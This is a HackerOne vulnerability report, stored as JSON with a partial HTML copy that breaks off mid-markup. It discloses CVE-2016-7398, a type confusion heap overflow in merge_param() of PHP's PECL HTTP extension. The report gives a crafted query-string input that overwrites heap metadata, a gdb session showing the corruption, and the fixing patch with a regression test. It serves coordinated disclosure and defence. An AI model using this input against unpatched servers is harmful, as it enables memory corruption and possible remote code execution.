{"id":172411,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI0MTE=","url":"https://hackerone.com/reports/172411","title":"Heap overflow caused by type confusion vulnerability in merge_param()","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-09-27T14:03:13.923Z","submitted_at":"2016-09-27T14:03:13.923Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rc0r","url":"/rc0r","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/153/304e6c45c12b1b9dec0c6c0f2ebd67341d234566_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-30T15:13:53.742Z","bug_reporter_agreed_on_going_public_at":"2017-05-06T08:21:23.749Z","team_member_agreed_on_going_public_at":"2017-05-30T15:13:53.682Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Since the original report is still marked as private in the PHP bug tracker please find the copy \u0026 pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!\n\nThe maintainer already fixed the issue in the public git repo using the proposed patch included in the original report.\n\nMitre assigned **CVE-2016-7398** for this issue.\n\n# Description\n\nThe url parsing functions of the PECL HTTP extension allow overflowing\na heap-based buffer with data originating from an arbitrary HTTP request.\nAffected is the `merge_param()` function in `php_http_params.c` that is called\nfrom `php_http_querystring_parse()`:  \n\nCode fragment from `merge_param()` in `php_http_params.c:491`:\n\n```c\nstatic void merge_param(HashTable *params, zval *zdata, ...)\n{\n/*[...]*/\n    while (Z_TYPE_P(zdata_ptr) == IS_ARRAY \u0026\u0026 (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {\n        if (Z_TYPE_P(test_ptr) == IS_ARRAY) {\n            zval *tmp_ptr = ptr;\n    \n/*[...]*/           \n            } else {\n                if ((ptr = zend_hash_index_find(Z_ARRVAL_P(ptr), hkey.h))) {\n                    zdata_ptr = test_ptr;\n                } else if (hkey.h) {\n                    ptr = tmp_ptr;\n                    Z_TRY_ADDREF_P(test_ptr);\n/*[511]*/           ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);\n/*[...]*/\n```\n\nIn line 511 `zend_hash_index_update()` is called with ptr used as an array\n(`Z_ARRVAL_P(ptr)`) without actually checking its type. Thus it was possible\nto call `zend_hash_index_update()` on a `zend_string` instead which obviously\nleads to memory corruption issues.\n\nThe sample request provided in this report uses this type confusion\nvulnerability to trigger an arbitrary heap overwrite. The actual overwrite\noccurs in `_zend_hash_index_add_or_update_i()`: \n\n```c\nstatic zend_always_inline zval *_zend_hash_index_add_or_update_i(HashTable *ht, zend_ulong h, zval *pData, uint32_t flag ZEND_FILE_LINE_DC)\n{\n/*[...]*/\nadd_to_hash:\n/*[...]*/\n    p = ht-\u003earData + idx;\n    p-\u003eh = h;\t\t\t\t\t\t// \u003c- heap overflow\n    p-\u003ekey = NULL;\t\t\t\t\t// \u003c- heap overflow\n/*[...]*/\n```\n\nBecause of the invalid pointer provided as HashTable `ht-\u003earData` points\nto an unexpected memory location on the heap and not to the list of Buckets\nof an ordinary `HashTable`. So the two following assignments allow to write\narbitrary values (`hkey.h` and `NULL`) on the heap.\nAs it turned out `hkey.h` can be controlled with request data received from\nthe network.  \nThe attached proof of concept demonstrates that this flaw very likely allows\nfor remote code execution.\n\nThis vulnerability was found using `afl-fuzz`/`afl-utils`.\n\n# PoC\n\nSee the attached patch for the sample request in `bug73055.bin`.\n\n```\n$ cat http_querystring.php\n/*\n * http_querystring.php\n */\n\u003c?php\n    $qs = new http\\QueryString(file_get_contents(\"bug73055.bin\"));\n?\u003e\n$ ./configure --enable-raphf --enable-propro --with-http \u0026\u0026 make\n$ gdb ./sapi/cli/php\ngdb\u003e b php_http_params.c:511\ngdb\u003e r http_querystring.php\n    Breakpoint 1, merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0,\n    params=\u003coptimized out\u003e) at php_http_params.c:511\n    511\t\t\t\tptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);\ngdb\u003e p ptr.u1.type_info\n    $1 = 6                      // \u003c-- IS_STRING, incorrect type!\ngdb\u003e b zend_hash.c:811\ngdb\u003e c\n    Breakpoint 2, _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at\n    zend_hash.c:811\n    811\t\tp-\u003eh = h;\t\t\t\t\t\t// \u003c- heap overflow\ngdb\u003e p \u0026p-\u003eh\n    $2 = (zend_ulong *) 0x1091f40\ngdb\u003e x/8gx 0x1091f20                    // heap before overflow\n    0x1091f20:\t0x000000006c72755c\t0x0000000000000021\n    0x1091f30:\t0x00007ffff5addb48\t0x0000000001092960\n    0x1091f40:\t0x0000000000000020\t0x0000000000000031 \u003c-- heap meta-data (prev-size, size)\n    0x1091f50:\t0x0000070600000001\t0x800000017c9c614a\ngdb\u003e ni 2\ngdb\u003e x/8gx 0x1091f20                    // heap after overflow\n    0x1091f20:\t0x000000006c72755c\t0x0000000000000021\n    0x1091f30:\t0x00007ffff5addb48\t0x0000000001092960\n    0x1091f40:\t0x0000000000004142\t0x0000000000000000 \u003c-- heap meta-data overwritten*\n    0x1091f50:\t0x0000070600000001\t0x800000017c9c614a\n    /*\n     * (*) 0x4142 originates from bug73055.bin offset 0x59\n     * The numeric string '16706' is converted into the integer\n     * it is representing 0x4142 (see sanitize_dimension()).\n     */\ngdb\u003e bt                                 // for the record\n    #0  _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at zend_hash.c:815\n    #1  _zend_hash_index_update (ht=0xf53dc0, h=16706, pData=pData@entry=0x7ffff425c6a0) at zend_hash.c:838\n    #2  0x00000000006b032b in merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0, params=\u003coptimized out\u003e) at php_http_params.c:511\n    #3  push_param (params=\u003coptimized out\u003e, state=\u003coptimized out\u003e, opts=\u003coptimized out\u003e) at php_http_params.c:607\n    #4  0x00000000006b2475 in php_http_params_parse (params=params@entry=0x7ffff42023f0, opts=opts@entry=0x7fffffff9e80) at php_http_params.c:755\n    #5  0x00000000006b5479 in php_http_querystring_parse (ht=0x7ffff42023f0, str=str@entry=0x7ffff4282018 '[' \u003crepeats 27 times\u003e, \"]]]]\", '[' \u003crepeats 38 times\u003e, \"\u0026%C0[]E[=\u00262[\u0026%C0[]E[16706[*[\", len=\u003coptimized out\u003e) at php_http_querystring.c:224\n    #6  0x00000000006b552c in php_http_querystring_update (qarray=qarray@entry=0x7fffffff9f80, params=params@entry=0x7ffff4213130, outstring=outstring@entry=0x0) at php_http_querystring.c:268\n    #7  0x00000000006b6029 in php_http_querystring_set (flags=0, params=0x7ffff4213130, instance=0x7ffff4213100) at php_http_querystring.c:49\n    #8  zim_HttpQueryString___construct (execute_data=\u003coptimized out\u003e, return_value=\u003coptimized out\u003e) at php_http_querystring.c:365\n    #9  0x00000000007b0a93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at zend_vm_execute.h:970\n    [...]\ngdb\u003e dis 1 2\ngdb\u003e c\n    Fatal error: Uncaught http\\Exception\\BadQueryStringException: http\\QueryString::__construct(): Max input nesting level of 64 exceeded in http_querystr.php:5\n    Stack trace:\n    #0 http_querystr.php(5): http\\QueryString-\u003e__construct('[[[[[[[[[[[[[[[...')\n    #1 {main}\n    \n    Next \u0001\n      thrown in http_querystr.php on line 5\n    *** Error in `sapi/cli/php': free(): invalid pointer: 0x0000000001091f50 ***\n    Program received signal SIGABRT, Aborted.\n    0x00007ffff577804f in raise () from /usr/lib/libc.so.6\n```\n\n# Patch\n\nAfter careful review by the project maintainers the following patch may be used\nto fix the reported issue. \n\n    From 34ae784c44be4a60157947f8ccc8c918e9b6ba40 Mon Sep 17 00:00:00 2001\n    From: rc0r \u003chlt99@blinkenshell.org\u003e\n    Date: Fri, 9 Sep 2016 11:31:57 +0200\n    Subject: [PATCH] Type confusion vulnerability in merge_param() (#73055) fixed\n    \n    ---\n     src/php_http_params.c   |  2 +-\n     tests/bug73055.phpt     | 25 +++++++++++++++++++++++++\n     tests/data/bug73055.bin |  1 +\n     3 files changed, 27 insertions(+), 1 deletion(-)\n     create mode 100644 tests/bug73055.phpt\n     create mode 100644 tests/data/bug73055.bin\n    \n    diff --git a/src/php_http_params.c b/src/php_http_params.c\n    index 8988f43..0846f47 100644\n    --- a/src/php_http_params.c\n    +++ b/src/php_http_params.c\n    @@ -489,7 +489,7 @@ static void merge_param(HashTable *params, zval *zdata, zval **current_param, zv\n                zval *test_ptr;\n     \n                while (Z_TYPE_P(zdata_ptr) == IS_ARRAY \u0026\u0026 (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {\n    -\t\t\t\tif (Z_TYPE_P(test_ptr) == IS_ARRAY) {\n    +\t\t\t\tif ((Z_TYPE_P(test_ptr) == IS_ARRAY) \u0026\u0026 (Z_TYPE_P(ptr) == IS_ARRAY)) {\n                        zval *tmp_ptr = ptr;\n     \n                        /* now find key in ptr */\n    diff --git a/tests/bug73055.phpt b/tests/bug73055.phpt\n    new file mode 100644\n    index 0000000..260e823\n    --- /dev/null\n    +++ b/tests/bug73055.phpt\n    @@ -0,0 +1,25 @@\n    +--TEST--\n    +Type confusion vulnerability in merge_param()\n    +--SKIPIF--\n    +\u003c?php\n    +include \"skipif.inc\";\n    +?\u003e\n    +--FILE--\n    +\u003c?php\n    +\n    +echo \"Test\\n\";\n    +try {\n    +\techo new http\\QueryString(file_get_contents(__DIR__.\"/data/bug73055.bin\")); // \u003c- put provided sample into correct location\n    +} catch (Exception $e) {\n    +\techo $e;\n    +}\n    +?\u003e\n    +\n    +===DONE===\n    +--EXPECTF--\n    +Test\n    +%r(exception ')?%rhttp\\Exception\\BadQueryStringException%r(' with message '|: )%rhttp\\QueryString::__construct(): Max input nesting level of 64 exceeded in %sbug73055.php:5\n    +Stack trace:\n    +#0 %sbug73055.php(5): http\\QueryString-\u003e__construct('[[[[[[[[[[[[[[[...')\n    +#1 {main}\n    +===DONE===\n    \\ No newline at end of file\n    diff --git a/tests/data/bug73055.bin b/tests/data/bug73055.bin\n    new file mode 100644\n    index 0000000..ad2dd9f\n    --- /dev/null\n    +++ b/tests/data/bug73055.bin\n    @@ -0,0 +1 @@\n    +[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[\u0026%C0[]E[=\u00262[\u0026%C0[]E[16706[*[\n    \\ No newline at end of file\n    -- \n    2.9.3\n\n# Versions known to be affected\n\npecl-http extension versions up to and including:\n\n* 3.1.0beta2 (PHP 7)\n* 2.6.0beta2 (PHP 5)\n\n\n# Timeline\n\n2016-09-09  Initial report to PHP bug tracker (#73055)\n2016-09-12  Issue fixed in git repository, CVE requested\n2016-09-13  Mitre assigned CVE-2016-7398\n\n\n# References\n\nhttps://bugs.php.net/bug.php?id=73055\nhttps://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398\n","vulnerability_information_html":"\u003cp\u003eSince the original report is still marked as private in the PHP bug tracker please find the copy \u0026amp; pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!\u003c/p\u003e\n\n\u003cp\u003eThe maintainer already fixed the issue in the public git repo using the proposed patch included in the original report.\u003c/p\u003e\n\n\u003cp\u003eMitre assigned \u003cstrong\u003eCVE-2016-7398\u003c/strong\u003e for this issue.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eThe url parsing functions of the PECL HTTP extension allow overflowing\u003cbr\u003e\na heap-based buffer with data originating from an arbitrary HTTP request.\u003cbr\u003e\nAffected is the \u003ccode\u003emerge_param()\u003c/code\u003e function in \u003ccode\u003ephp_http_params.c\u003c/code\u003e that is called\u003cbr\u003e\nfrom \u003ccode\u003ephp_http_querystring_parse()\u003c/code\u003e:  \u003c/p\u003e\n\n\u003cp\u003eCode fragment from \u003ccode\u003emerge_param()\u003c/code\u003e in \u003ccode\u003ephp_http_params.c:491\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003emerge_param\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eHashTable\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ezval\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ezdata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e...)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*[...]*/\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eZ_TYPE_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ezdata_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eIS_ARRAY\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etest_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_hash_get_current_data\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eZ_ARRVAL_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ezdata_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eZ_TYPE_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etest_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eIS_ARRAY\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ezval\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etmp_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"cm\"\u003e/*[...]*/\u003c/span\u003e           \n            \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_hash_index_find\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eZ_ARRVAL_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003ehkey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"n\"\u003ezdata_ptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etest_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ehkey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etmp_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                    \u003cspan class=\"n\"\u003eZ_TRY_ADDREF_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etest_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*[511]*/\u003c/span\u003e           \u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_hash_index_update\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eZ_ARRVAL_P\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003ehkey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etest_ptr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*[...]*/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn line 511 \u003ccode\u003ezend_hash_index_update()\u003c/code\u003e is called with ptr used as an array\u003cbr\u003e\n(\u003ccode\u003eZ_ARRVAL_P(ptr)\u003c/code\u003e) without actually checking its type. Thus it was possible\u003cbr\u003e\nto call \u003ccode\u003ezend_hash_index_update()\u003c/code\u003e on a \u003ccode\u003ezend_string\u003c/code\u003e instead which obviously\u003cbr\u003e\nleads to memory corruption issues.\u003c/p\u003e\n\n\u003cp\u003eThe sample request provided in this report uses this type confusion\u003cbr\u003e\nvulnerability to trigger an arbitrary heap overwrite. The actual overwrite\u003cbr\u003e\noccurs in \u003ccode\u003e_zend_hash_index_add_or_update_i()\u003c/code\u003e: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_always_inline\u003c/span\u003e \u003cspan class=\"n\"\u003ezval\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nf\"\u003e_zend_hash_index_add_or_update_i\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eHashTable\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eht\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_ulong\u003c/span\u003e \u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ezval\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003epData\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003euint32_t\u003c/span\u003e \u003cspan class=\"n\"\u003eflag\u003c/span\u003e \u003cspan class=\"n\"\u003eZEND_FILE_LINE_DC\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*[...]*/\u003c/span\u003e\n\u003cspan class=\"nl\"\u003eadd_to_hash:\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*[...]*/\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eht\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003earData\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eh\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e                       \u003cspan class=\"c1\"\u003e// \u0026lt;- heap overflow\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e                  \u003cspan class=\"c1\"\u003e// \u0026lt;- heap overflow\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*[...]*/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause of the invalid pointer provided as HashTable \u003ccode\u003eht-\u0026gt;arData\u003c/code\u003e points\u003cbr\u003e\nto an unexpected memory location on the heap and not to the list of Buckets\u003cbr\u003e\nof an ordinary \u003ccode\u003eHashTable\u003c/code\u003e. So the two following assignments allow to write\u003cbr\u003e\narbitrary values (\u003ccode\u003ehkey.h\u003c/code\u003e and \u003ccode\u003eNULL\u003c/code\u003e) on the heap.\u003cbr\u003e\nAs it turned out \u003ccode\u003ehkey.h\u003c/code\u003e can be controlled with request data received from\u003cbr\u003e\nthe network.\u003cbr\u003e\u003cbr\u003e\nThe attached proof of concept demonstrates that this flaw very likely allows\u003cbr\u003e\nfor remote code execution.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability was found using \u003ccode\u003eafl-fuzz\u003c/code\u003e/\u003ccode\u003eafl-utils\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003cp\u003eSee the attached patch for the sample request in \u003ccode\u003ebug73055.bin\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003ehttp_querystring\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/*\n * http_querystring.php\n */\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$qs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003ehttp\\QueryString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003efile_get_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;bug73055.bin\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n$ ./configure --enable-raphf --enable-propro --with-http \u003cspan class=\"err\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e make\n$ gdb ./sapi/cli/php\ngdb\u0026gt; b php_http_params.c:511\ngdb\u0026gt; r http_querystring.php\n    Breakpoint 1, merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0,\n    params=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e) at php_http_params.c:511\n    511             ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);\ngdb\u0026gt; p ptr.u1.type_info\n    $1 = 6                      // \u003cspan class=\"nt\"\u003e\u0026lt;--\u003c/span\u003e \u003cspan class=\"na\"\u003eIS_STRING\u003c/span\u003e\u003cspan class=\"err\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003eincorrect\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"err\"\u003e!\u003c/span\u003e\n\u003cspan class=\"na\"\u003egdb\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e b zend_hash.c:811\ngdb\u0026gt; c\n    Breakpoint 2, _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at\n    zend_hash.c:811\n    811     p-\u0026gt;h = h;                       // \u003cspan class=\"nt\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan class=\"na\"\u003eheap\u003c/span\u003e \u003cspan class=\"na\"\u003eoverflow\u003c/span\u003e\n\u003cspan class=\"na\"\u003egdb\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e p \u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003ep-\u0026gt;h\n    $2 = (zend_ulong *) 0x1091f40\ngdb\u0026gt; x/8gx 0x1091f20                    // heap before overflow\n    0x1091f20:  0x000000006c72755c  0x0000000000000021\n    0x1091f30:  0x00007ffff5addb48  0x0000000001092960\n    0x1091f40:  0x0000000000000020  0x0000000000000031 \u003cspan class=\"nt\"\u003e\u0026lt;--\u003c/span\u003e \u003cspan class=\"na\"\u003eheap\u003c/span\u003e \u003cspan class=\"na\"\u003emeta-data\u003c/span\u003e \u003cspan class=\"err\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003eprev-size\u003c/span\u003e\u003cspan class=\"err\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003esize\u003c/span\u003e\u003cspan class=\"err\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"na\"\u003e0x1091f50:\u003c/span\u003e  \u003cspan class=\"na\"\u003e0x0000070600000001\u003c/span\u003e  \u003cspan class=\"na\"\u003e0x800000017c9c614a\u003c/span\u003e\n\u003cspan class=\"na\"\u003egdb\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e ni 2\ngdb\u0026gt; x/8gx 0x1091f20                    // heap after overflow\n    0x1091f20:  0x000000006c72755c  0x0000000000000021\n    0x1091f30:  0x00007ffff5addb48  0x0000000001092960\n    0x1091f40:  0x0000000000004142  0x0000000000000000 \u003cspan class=\"nt\"\u003e\u0026lt;--\u003c/span\u003e 